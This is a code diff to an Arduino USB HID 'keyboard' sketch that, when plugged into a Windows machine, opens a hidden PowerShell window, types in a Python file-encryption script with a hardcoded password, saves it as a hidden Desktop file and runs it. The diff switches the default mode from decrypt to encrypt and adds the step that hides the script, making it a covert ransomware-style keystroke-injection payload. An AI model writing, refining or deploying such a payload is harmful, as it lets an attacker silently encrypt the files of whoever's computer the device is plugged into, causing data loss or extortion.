@@ -4,33 +4,61 @@
 
 USBHIDKeyboard Keyboard;
 
-// Change this to "e" for encrypt or "d" for decrypt before flashing
-const char* MODE = "d";
+//================= User Settings =================
 
+// Mode selector: 
+//   "e" = encrypt, "d" = decrypt
+//   Set before flashing the sketch
+const char* MODE = "e";
+
+// Typing delay multiplier: 
+//   Smaller values = faster keystrokes
+//   Must be >= 1.0 for stability
+float speed = 20.0;   
+
+//==================================================
+
+//--------------------------------------------------
+// Function: typeLine
+// Purpose : Types a given string into the host, 
+//           presses RETURN, then waits briefly.
+// Params  : const char* line - the text to type.
+//--------------------------------------------------
 void typeLine(const char* line) {
   Keyboard.print(line);
   Keyboard.write(KEY_RETURN);
-  delay(0);
+  delay(speed * 0.5); // Short pause to ensure command is processed
 }
 
+//--------------------------------------------------
+// Function: setup
+// Purpose : Initializes USB HID, launches hidden 
+//           PowerShell, types an embedded Python 
+//           script that performs encryption or 
+//           decryption (with auto library install).
+//--------------------------------------------------
 void setup() {
+  // Initialize USB HID
   USB.begin();
   Keyboard.begin();
-  delay(500);
+  delay(speed * 30); // Initial pause to ensure OS readiness
 
-  // Launch hidden PowerShell
+  // Open Windows Run dialog (Win+R)
   Keyboard.press(KEY_LEFT_GUI);
   Keyboard.press('r');
   Keyboard.releaseAll();
-  delay(100);
-  Keyboard.print("powershell -WindowStyle Hidden");
-  Keyboard.write(KEY_RETURN);
-  delay(200);
+  delay(speed * 15);
 
-  // Begin here-string
+  // Launch PowerShell in hidden window
+  Keyboard.print("powershell -WindowStyle Hidden");
+  delay(speed * 4);
+  Keyboard.write(KEY_RETURN);
+  delay(speed * 20);
+
+  // Start PowerShell here-string for Python script content
   typeLine("@\"");
 
-  // Python script with auto-install
+  // ---- Python script begins ----
   typeLine("import os, sys, time, base64, shutil, subprocess");
   typeLine("try:");
   typeLine("    from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC");
@@ -50,7 +78,7 @@ void setup() {
   typeLine("KEY_BACKUP_FILE = os.path.expanduser('~/Documents/keyfile_backup.key')");
   typeLine("LOG_FILE = 'encryptor.log'");
   typeLine("PASSWORD = '12345678'");
-  typeLine(("MODE = '" + String(MODE) + "'").c_str()); // FIXED LINE
+  typeLine(("MODE = '" + String(MODE) + "'").c_str());
   typeLine("");
   typeLine("def log(msg):");
   typeLine("    with open(LOG_FILE, 'a', encoding='utf-8') as f:");
@@ -135,13 +163,21 @@ void setup() {
   typeLine("    else:");
   typeLine("        log('[!] Invalid mode.')");
   typeLine("    log('=== Process Finished ===')");
+  // ---- Python script ends ----
 
-  // End here-string & save file
+  // Save Python script to Desktop as hidden file
   typeLine("\"@ | Set-Content $env:USERPROFILE\\Desktop\\safe_dual_mode.py");
+  typeLine("Set-ItemProperty \"$env:USERPROFILE\\Desktop\\safe_dual_mode.py\" -Name Attributes -Value Hidden");
 
-  // Run the script
+  // Execute Python script
   typeLine("python $env:USERPROFILE\\Desktop\\safe_dual_mode.py");
+
+  // Exit PowerShell session
   typeLine("exit");
 }
 
+//--------------------------------------------------
+// Function: loop
+// Purpose : Not used; HID payload only runs once.
+//--------------------------------------------------
 void loop() {}
